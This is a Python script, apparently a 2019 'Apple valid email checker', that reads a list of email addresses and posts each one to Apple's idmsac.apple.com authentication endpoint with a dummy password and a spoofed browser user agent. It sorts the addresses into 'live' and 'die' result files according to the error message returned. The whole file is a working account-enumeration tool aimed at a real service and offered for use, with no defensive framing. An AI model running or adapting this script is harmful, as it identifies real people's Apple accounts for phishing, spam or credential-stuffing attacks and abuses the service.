# -*- coding: utf-8 -*-
# Codeed By DsXWEB19778
# Python LOV3er
# Contact To facebook.com/name.path
# Github/DsWeb19778
import requests as p
import datetime as dt
import platform as ps
from fake_useragent import UserAgent
import os
import time
import sys
import random as h
import colorama as c
from os import path as y
# SET COLOR :
red = c.Fore.LIGHTRED_EX
green = c.Fore.LIGHTGREEN_EX
yellow = c.Fore.LIGHTYELLOW_EX
blue = c.Fore.LIGHTBLUE_EX
giv_p = ps.system()
if(giv_p == "Windows"):
	os.system("cls")
	color_green = "a"
	color_red = "c"
	os.system("color "+str(color_red))
else:
	os.system("clear")
clear = "\x1b[0m"
colors = [36,30]  
xlog = """ 
  DDDDDDDDD   SSSSSSSSSS 
  DD     DD   SS      SS
  DD     DD           SS
  DD     DD   SSSSSSSSSS     Accurate 100%
  DD     DD   SS             DSWEB19778  
  DD     DD   SS      SS     2019
  DDDDDDDDD   SSSSSSSSSS          
"""
for N, line in enumerate(xlog.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (h.choice(colors), line, clear))
            time.sleep(0.05)
print("[+] Coded By DsWeb19778 >> 2019 [REALYEAR]")
print("[+] CopyRight | >> facebook.com/name.path")
print("[+] APPLE VALID EMAIL CHECKER ... ")
def mydate(): # FUnction FOr DATE
    year = dt.datetime.now().year
    month = dt.datetime.now().month
    day = dt.datetime.now().day
    print("[+] Scan at "+str(year)+"/"+str(month)+"/"+str(day))	
mydate()
# Url Exploited 
url = "https://idmsac.apple.com/authenticate"
# hahah Mailist
appleId = input(">> My Mailist File /..//..>>>> ")
print(">> RZLT FILE...")
time.sleep(3)
# Create File RZT
if(y.isdir("rzlt")):
	print("[+] Dir Exist.")
else:
	os.mkdir("rzlt")
	print("[+] File Created.")
print("[+] Start Scaning ... \n")
# Data SET
env = "PROD"
accNameLocked = env
accountPassword = "1o"
appIdKey = "3b356c1bac5ad9735ad62f24d43414eb59715cc4d21b178835626ce0d2daa77d"
fdcBrowserData = ""
language = "US-EN"
openiForgotInNewWindow = "true"
path = "/"
requestUri = "/login.html"
rv = "1"
#scnt = "31b0020ec593370016a61dc388f8965e"
scnt = "31b0020ec593370016a61dc388f8965e"
view = "5"
Mode_File = "r+"
try:
  open_file = open(appleId,Mode_File)
  read_me = open_file.readlines()
  get_listcount = len(read_me)
  print(green+"[+] YOU HAVE >> "+str(get_listcount)+" ACCOUNT\n") 
  time_full = "- " + blue + time.ctime() + " "
  #print("We have ERROR FILE :>> "+str(e))  
  for i in read_me:
      i.strip()
      # POST DATA 
      get_data = {"env":env,"accNameLocked":accNameLocked,"accountPassword":accountPassword,"appIdKey":appIdKey,"appleId":i,"fdcBrowserData":fdcBrowserData,"language":language,"openiForgotInNewWindow":openiForgotInNewWindow,"path":path,"requestUri":requestUri,"rv":rv,"scnt":scnt,"view":view}
      my_fake_s = UserAgent() # GEN FAKE AGENT 
      headers = {'User-Agent': my_fake_s.chrome}
      connect = p.post(url,params=get_data,headers=headers).content
      # valid_msg = "Application has insufficient privileges to perform this action".encode()
      dia_msg = "Your Apple ID or password was entered incorrectly.".encode()
      #get_listed = get_email_validation["result"]
      if(dia_msg in connect):
        	print(time_full+red+"[-] Die :>> "+i)
        	save_invalid = open("rzlt/die.txt","a+")
        	save_invalid.write(i)
      else:
          print(time_full+green+"[+] Valid :>> "+i)
          save_valid = open("rzlt/live.txt","a+")
          save_valid.write(i)   
except IOError as e:
  print("[-_-] We have ERROR FILE :>> "+str(e))
